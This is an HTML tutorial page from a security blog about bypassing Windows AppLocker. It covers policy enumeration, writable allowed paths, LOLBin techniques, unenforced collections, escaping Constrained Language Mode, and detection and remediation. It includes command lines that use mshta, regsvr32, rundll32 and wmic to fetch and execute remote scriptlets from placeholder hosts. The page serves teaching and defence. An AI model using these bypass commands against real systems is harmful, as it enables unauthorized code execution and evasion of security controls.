@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AppLocker Bypass — Satej Chaudhari</title>
+  <meta name="description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Satej Chaudhari">
+  <meta property="og:title" content="AppLocker Bypass">
+  <meta property="og:description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <meta property="og:url" content="https://satejchaudhari.com/theory/2026-10-08-applocker-bypass.html">
+  <meta property="og:image" content="https://satejchaudhari.com/assets/img/og-default.png">
+  <meta property="article:published_time" content="2026-10-08">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="AppLocker Bypass">
+  <meta name="twitter:description" content="How Windows AppLocker application whitelisting is enumerated and bypassed — writable allowed paths, trusted LOLBins (InstallUtil, Mshta, MSBuild, Regsvr32, Rundll32), the unenforced DLL/script collections, and the Constrained Language Mode angle.">
+  <meta name="twitter:image" content="https://satejchaudhari.com/assets/img/og-default.png">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+
+  <a class="skip-link" href="#main">Skip to main content</a>
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../theory.html" aria-current="page">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../writeups.html">Writeups</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main id="main" tabindex="-1" class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">Evasion</span>
+        <h1 class="post-title">AppLocker Bypass</h1>
+        <p class="post-meta">
+          <time datetime="2026-10-08">2026-10-08</time>
+          <span>&middot; 11 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p>
+          AppLocker is Windows' built-in application whitelisting — a policy that
+          decides which executables, scripts, installers and libraries a user is
+          allowed to run. On a well-run host it is a real obstacle: you have a
+          foothold as a low-privileged user, your tooling will not launch, and
+          PowerShell has quietly dropped into a restricted mode. Bypassing it is
+          rarely about finding a "vulnerability"; it is about understanding
+          exactly what the policy does and does not cover, then running your code
+          through a path it was never written to stop. This page is the mechanism
+          behind the <a href="../ad-map.html">AD map's</a> "Bypass AppLocker"
+          step.
+        </p>
+
+        <h2>How AppLocker actually works</h2>
+        <p>
+          AppLocker evaluates every launch against a set of <strong>rule
+          collections</strong>, one per file kind:
+        </p>
+        <ul>
+          <li><strong>Exe</strong> — <code>.exe</code>, <code>.com</code></li>
+          <li><strong>Script</strong> — <code>.ps1</code>, <code>.bat</code>, <code>.cmd</code>, <code>.vbs</code>, <code>.js</code></li>
+          <li><strong>Msi</strong> — <code>.msi</code>, <code>.msp</code>, <code>.mst</code> installers</li>
+          <li><strong>Dll</strong> — <code>.dll</code>, <code>.ocx</code></li>
+          <li><strong>Appx</strong> — packaged (Store) apps</li>
+        </ul>
+        <p>
+          Each rule allows or denies by one of three criteria:
+          <strong>publisher</strong> (the code-signing certificate — the
+          strongest), <strong>path</strong> (a directory or file location — the
+          weakest), or <strong>hash</strong> (exact file, breaks on any update).
+          A collection also has an <strong>enforcement mode</strong>:
+          <em>Enforce</em>, <em>Audit only</em> (logs but still runs — effectively
+          off), or <em>not configured</em> (no restriction at all). Two facts
+          flow straight from this design and drive almost every bypass:
+        </p>
+        <blockquote>
+          The Dll and Script collections are frequently left <em>not
+          configured</em> or in <em>Audit only</em> — enforcing Dll rules hurts
+          performance and is off by default — and the default "allow everything
+          in <code>%WINDIR%</code> and <code>%PROGRAMFILES%</code>" path rules
+          trust whole directory trees that a standard user can sometimes write
+          into.
+        </blockquote>
+
+        <h2>Step 1 — Enumerate the policy</h2>
+        <p>
+          You cannot pick a bypass until you know which collections are enforced
+          and how. Read the effective policy before anything else:
+        </p>
+        <pre><code># the effective, merged policy as XML — read EnforcementMode on each collection
+Get-AppLockerPolicy -Effective -Xml
+
+# or pull it straight from the registry (local + domain GPO merge lands here)
+Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
+# subkeys: Exe  Dll  Script  Msi  Appx  — each holds the rules for that collection
+
+# ask AppLocker directly whether a specific binary would be allowed for you
+Get-AppLockerPolicy -Effective |
+  Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User $env:USERNAME</code></pre>
+        <p>
+          Read it like a defender would: which collections say
+          <code>Enforce</code>? Are the rules publisher-based (hard) or
+          path-based (soft)? Is Dll or Script merely <code>AuditOnly</code> or
+          absent? The gaps you find decide which of the techniques below you
+          reach for.
+        </p>
+
+        <h2>Bypass 1 — Writable paths inside allowed directories</h2>
+        <p>
+          The default rule set allows anything under <code>C:\Windows</code> and
+          <code>C:\Program Files</code> to run. Those trees are meant to be
+          admin-only, but several subdirectories are writable by a standard user
+          — drop your binary there and it runs from an "allowed" path. Enumerate
+          them rather than trusting a list:
+        </p>
+        <pre><code># find user-writable directories under the allowed trees
+accesschk.exe -accepteula -wus "Everyone" C:\Windows\ -q
+# or with icacls, hunt for (M)odify / (W)rite / (F)ull for your groups
+icacls C:\Windows\Tasks</code></pre>
+        <table>
+          <thead><tr><th>Commonly writable, commonly allowed</th></tr></thead>
+          <tbody>
+            <tr><td><code>C:\Windows\Temp</code></td></tr>
+            <tr><td><code>C:\Windows\Tasks</code></td></tr>
+            <tr><td><code>C:\Windows\tracing</code></td></tr>
+            <tr><td><code>C:\Windows\System32\spool\drivers\color</code></td></tr>
+            <tr><td><code>C:\Windows\System32\spool\PRINTERS</code></td></tr>
+            <tr><td><code>C:\Windows\registration\CRMLog</code></td></tr>
+          </tbody>
+        </table>
+        <p>
+          The exact set varies by build and by how custom the policy is — that is
+          why you enumerate with <code>accesschk</code>/<code>icacls</code> on the
+          target rather than assuming. The fix a mature environment applies is to
+          replace broad path rules with publisher rules, which closes this entire
+          class.
+        </p>
+
+        <h2>Bypass 2 — Trusted LOLBins (the main event)</h2>
+        <p>
+          The most reliable bypass does not drop a new executable at all. Windows
+          ships signed, Microsoft-published binaries whose <em>job</em> is to
+          execute code supplied to them — .NET installers, script hosts, build
+          tools. A publisher rule that allows "signed by Microsoft" (or the
+          default rules that allow all of <code>%WINDIR%</code>) therefore allows
+          these too, and your payload rides in as data they happily run. These
+          are the classic
+          <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>
+          AppLocker bypasses.
+        </p>
+
+        <h3>InstallUtil</h3>
+        <p>
+          A .NET Framework utility that installs/uninstalls assemblies by invoking
+          their installer classes. Build an assembly whose
+          <code>[RunInstaller(true)]</code> class puts your code in an
+          <code>Uninstall</code> override, then have InstallUtil "uninstall" it —
+          your code runs, and the launch is InstallUtil, not your binary:
+        </p>
+        <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe ^
+  /logfile= /LogToConsole=false /U C:\Windows\Temp\runme.exe</code></pre>
+
+        <h3>Mshta</h3>
+        <p>
+          The HTML Application host. It runs the VBScript/JScript embedded in an
+          <code>.hta</code> file, or inline straight from the command line, or
+          from a remote scriptlet — no local executable needed:
+        </p>
+        <pre><code>mshta.exe C:\Windows\Temp\payload.hta
+mshta.exe vbscript:Close(Execute("GetObject(""script:https://host/x.sct"")"))
+mshta.exe "javascript:a=GetObject('script:https://host/x.sct');close();"</code></pre>
+
+        <h3>MSBuild</h3>
+        <p>
+          The build engine ships with the .NET Framework and can run arbitrary C#
+          from an <strong>inline task</strong> inside a project file. Feed it a
+          crafted <code>.xml</code>/<code>.csproj</code> and MSBuild compiles and
+          executes your code in-process — a full C# runner that is both signed and
+          whitelisted, and which also sidesteps PowerShell's restricted mode:
+        </p>
+        <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\payload.xml
+# payload.xml holds a <Project><Target><... /></Target></Project> with an inline
+# Microsoft.Build.Framework.ITask whose Execute() contains the C# to run</code></pre>
+
+        <h3>Regsvr32 (Squiblydoo)</h3>
+        <p>
+          Registers a COM scriptlet. With <code>scrobj.dll</code> it will fetch and
+          execute a remote <code>.sct</code> over HTTP(S) without writing anything
+          that AppLocker inspects, and without touching the registry
+          (<code>/n</code>):
+        </p>
+        <pre><code>regsvr32 /s /n /u /i:https://host/payload.sct scrobj.dll</code></pre>
+
+        <h3>Rundll32</h3>
+        <p>
+          Executes a function exported by a DLL — and, because the Dll collection
+          is so often unenforced, also runs JavaScript via the old mshtml path:
+        </p>
+        <pre><code>rundll32.exe C:\Windows\Temp\evil.dll,EntryPoint
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=GetObject("script:https://host/x.sct")</code></pre>
+
+        <h3>More of the same class</h3>
+        <table>
+          <thead><tr><th>LOLBin</th><th>How it runs your code</th></tr></thead>
+          <tbody>
+            <tr><td><code>cscript</code> / <code>wscript</code></td><td>Run <code>.vbs</code>/<code>.js</code> directly when the Script collection is not enforced</td></tr>
+            <tr><td><code>cmstp.exe</code></td><td>Executes commands from a crafted INF (Connection Manager profile)</td></tr>
+            <tr><td><code>msiexec</code></td><td>Installs a local or remote <code>.msi</code> if the Msi collection is weak</td></tr>
+            <tr><td><code>control.exe</code> / <code>.cpl</code></td><td>Loads a control-panel DLL (rides the unenforced Dll collection)</td></tr>
+            <tr><td><code>InstallUtil</code> / <code>regasm</code> / <code>regsvcs</code></td><td>Trigger .NET assembly methods during (un)install/registration</td></tr>
+            <tr><td><code>wmic.exe</code></td><td><code>wmic ... /format:"https://host/evil.xsl"</code> runs a remote XSL script</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Bypass 3 — The unenforced collections</h2>
+        <p>
+          If enumeration showed Dll or Script as <em>not configured</em> or
+          <em>AuditOnly</em>, the bypass is almost free. An unenforced
+          <strong>Dll</strong> collection means <code>rundll32</code>,
+          <code>regsvr32</code>, control-panel applets, and side-loaded libraries
+          all run unchecked — so convert your payload to a DLL. An unenforced
+          <strong>Script</strong> collection means <code>.ps1</code>/
+          <code>.vbs</code>/<code>.bat</code> are fair game. Enforcing every
+          collection with publisher rules is what removes these shortcuts, which
+          is precisely why so few deployments do it.
+        </p>
+
+        <h2>Bypass 4 — Escaping Constrained Language Mode</h2>
+        <p>
+          When AppLocker (or WDAC) enforces script rules, PowerShell drops into
+          <strong>Constrained Language Mode (CLM)</strong>, which blocks
+          <code>Add-Type</code>, .NET calls, COM, and most offensive one-liners —
+          it is often the thing that actually stops you, not the Exe rule. The
+          LOLBins above are also the CLM escape: MSBuild and InstallUtil run full
+          C# outside PowerShell entirely, so you regain an unrestricted execution
+          environment. Watch for a policy that enforces Exe/Script but leaves the
+          door for a signed build tool wide open.
+        </p>
+        <pre><code># CLM check — if this prints "ConstrainedLanguage" you are restricted
+$ExecutionContext.SessionState.LanguageMode</code></pre>
+
+        <h2>Detection &amp; remediation</h2>
+        <ul>
+          <li>
+            <strong>Prefer publisher rules over path rules</strong>, and remove the
+            broad <code>%WINDIR%</code>/<code>%PROGRAMFILES%</code> default allows —
+            that single change kills the writable-path class and most LOLBin
+            abuse that relies on "allow all of Windows".
+          </li>
+          <li>
+            <strong>Enforce every collection</strong>, Dll and Script included —
+            an unenforced collection is an open door, and <em>AuditOnly</em> is
+            not enforcement.
+          </li>
+          <li>
+            <strong>Block or constrain the known runners</strong> you do not need —
+            InstallUtil, MSBuild, Mshta, Regsvr32, cmstp, wmic — via deny rules and
+            Microsoft's recommended block list. Pair AppLocker with
+            <strong>WDAC</strong> for a far stronger, kernel-enforced policy.
+          </li>
+          <li>
+            <strong>Monitor the AppLocker logs</strong> —
+            <code>Microsoft-Windows-AppLocker/EXE and DLL</code> (events
+            <strong>8003</strong> audit / <strong>8004</strong> blocked) and the
+            MSI/Script log — and alert on the LOLBins above executing with
+            network-facing or scriptlet arguments.
+          </li>
+        </ul>
+
+        <h2>Related reading</h2>
+        <ul class="related-list">
+          <li><a href="2026-09-23-defense-evasion.html">Windows Defense Evasion — AV, EDR &amp; ASR</a></li>
+          <li><a href="2026-09-23-windows-telemetry-logging.html">Windows Telemetry &amp; PowerShell Logging</a></li>
+          <li><a href="2026-09-23-in-memory-tradecraft.html">In-Memory Post-Exploitation Tradecraft</a></li>
+          <li><a href="2026-08-18-windows-tokens-uac.html">Windows Access Tokens &amp; UAC</a></li>
+          <li><a href="../ad-map.html">AD Attack-Path Map &mdash; Local privesc</a></li>
+        </ul>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../theory.html">Theory</a>
+<a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+
+  <script src="../assets/js/main.js"></script>
+  <script src="../assets/js/post-enhance.js"></script>
+</body>
+</html>
